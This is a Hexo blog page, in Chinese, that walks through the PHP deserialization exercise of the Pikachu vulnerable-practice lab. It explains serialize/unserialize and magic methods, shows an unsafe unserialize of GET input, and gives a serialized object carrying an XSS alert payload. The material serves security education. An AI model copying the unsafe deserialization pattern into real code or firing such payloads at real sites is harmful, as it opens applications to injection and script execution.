@@ -1,0 +1,262 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>pikachu解题漏洞报告-PHP反序列化漏洞 - Hexo</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="pikachu解题漏洞报告-PHP反序列化漏洞概念在理解这个漏洞前,需要先搞清楚php中serialize()，unserialize()这两个函数。
+序列化serialize()
+序列化说通俗点就,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="Hexo" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+    
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:title" content="pikachu解题漏洞报告-PHP反序列化漏洞 - Hexo"/>
+    <meta name="twitter:description" content="pikachu解题漏洞报告-PHP反序列化漏洞概念在理解这个漏洞前,需要先搞清楚php中serialize()，unserialize()这两个函数。
+序列化serialize()
+序列化说通俗点就,"/>
+    
+    
+    
+    
+    <meta property="og:site_name" content="Hexo"/>
+    <meta property="og:type" content="object"/>
+    <meta property="og:title" content="pikachu解题漏洞报告-PHP反序列化漏洞 - Hexo"/>
+    <meta property="og:description" content="pikachu解题漏洞报告-PHP反序列化漏洞概念在理解这个漏洞前,需要先搞清楚php中serialize()，unserialize()这两个函数。
+序列化serialize()
+序列化说通俗点就,"/>
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">Hexo</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">pikachu解题漏洞报告-PHP反序列化漏洞</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">pikachu解题漏洞报告-PHP反序列化漏洞</h1>
+        <div class="stuff">
+            <span>四月 03, 2022</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h1 id="pikachu解题漏洞报告-PHP反序列化漏洞"><a href="#pikachu解题漏洞报告-PHP反序列化漏洞" class="headerlink" title="pikachu解题漏洞报告-PHP反序列化漏洞"></a>pikachu解题漏洞报告-PHP反序列化漏洞</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>在理解这个漏洞前,需要先搞清楚php中serialize()，unserialize()这两个函数。</p>
+<p>序列化serialize()</p>
+<p>序列化说通俗点就是把一个对象变成可以传输的字符串,比如下面是一个对象:</p>
+<pre><code>class S&#123;
+    public $test=&quot;pikachu&quot;;
+&#125;
+$s=new S(); //创建一个对象
+serialize($s); //把这个对象进行序列化
+序列化后得到的结果是这个样子的:O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;
+
+    O:代表object
+
+    1:代表对象名字长度为一个字符
+
+    S:对象的名称
+
+    1:代表对象里面有一个变量
+
+    s:数据类型
+
+    4:变量名称的长度
+
+    test:变量名称
+
+    s:数据类型
+
+    7:变量值的长度
+
+    pikachu:变量值
+</code></pre>
+<p>反序列化unserialize()</p>
+<p>就是把被序列化的字符串还原为对象,然后在接下来的代码中继续使用。</p>
+<pre><code>$u=unserialize(&quot;O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;&quot;);
+echo $u-&gt;test; //得到的结果为pikachu
+</code></pre>
+<p>序列化和反序列化本身没有问题,但是如果反序列化的内容是用户可以控制的,且后台不正当的使用了PHP中的魔法函数,就会导致安全问题</p>
+<p>常见的几个魔法函数:</p>
+<p>__construct()当一个对象创建时被调用</p>
+<p>__destruct()当一个对象销毁时被调用</p>
+<p>__toString()当一个对象被当作一个字符串使用</p>
+<p>__sleep() 在对象在被序列化之前运行</p>
+<p>__wakeup将在序列化之后立即被调用</p>
+<p>漏洞举例:</p>
+<pre><code>    class S&#123;
+        var $test = &quot;pikachu&quot;;
+        function __destruct()&#123;
+            echo $this-&gt;test;
+        &#125;
+    &#125;
+    $s = $_GET[&#39;test&#39;];
+    @$unser = unserialize($a);
+
+    payload:O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;;&#125;
+</code></pre>
+<h2 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h2><p>1.输入框要求输入序列化的数据，所以输入的payload必须是序列化的</p>
+<p><img src="https://raw.githubusercontent.com/virbellez/pigo/master/images/20220406160733.png" alt="20220406160733"></p>
+<p>2.写一个php文件，内容为将弹窗命令进行序列化，pikachu根目录下的文件可以直接在url访问，利用一下，把这个文件放在pikachu根目录下，</p>
+<p><img src="https://raw.githubusercontent.com/virbellez/pigo/master/images/20220406161052.png" alt="20220406161052"></p>
+<pre><code>&lt;?php
+class S&#123;
+    var $test = &quot;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;;
+&#125;
+
+echo &#39;&lt;br&gt;&#39;;
+$a = new S();
+echo serialize($a);
+?&gt;
+</code></pre>
+<p>3.然后直接在url访问这个文件，得到输出序列化内容，但是后面的<script>alert('xss')</script>没有显示，因为script标签被解析了，右键打开源码查看就可以看到</p>
+<pre><code>O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&quot;;&#125;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/virbellez/pigo/master/images/20220408110508.png" alt="20220408110508"></p>
+<p>4.构造payload</p>
+<pre><code>O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;;&#125;
+</code></pre>
+<p>5.在输入框输入payload,返回弹窗，命令得到执行</p>
+<p><img src="https://raw.githubusercontent.com/virbellez/pigo/master/images/20220406161401.png" alt="20220406161401"></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title="0" data-url="https://link.jscdn.cn/1drv/aHR0cHM6Ly8xZHJ2Lm1zL3UvcyFBb05yS01seWpjbkZnMHNkazB1a3lqNl9kMl82P2U9aDgxYUZQ.wav"></li>
+                        
+                    
+                        
+                            <li title="1" data-url="https://link.jscdn.cn/1drv/aHR0cHM6Ly8xZHJ2Lm1zL3UvcyFBb05yS01seWpjbkZnMHhtbVE0d01TYUZqQ2w4P2U9MGpOaFVZ.wav"></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id="gitalk-container" class="comment link"
+		data-enable="false"
+        data-ae="false"
+        data-ci=""
+        data-cs=""
+        data-r=""
+        data-o=""
+        data-a=""
+        data-d="false"
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class="side">
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pikachu%E8%A7%A3%E9%A2%98%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">pikachu解题漏洞报告-PHP反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5"><span class="toc-number">1.1.</span> <span class="toc-text">概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%B5%81%E7%A8%8B"><span class="toc-number">1.2.</span> <span class="toc-text">解题流程</span></a></li></ol></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
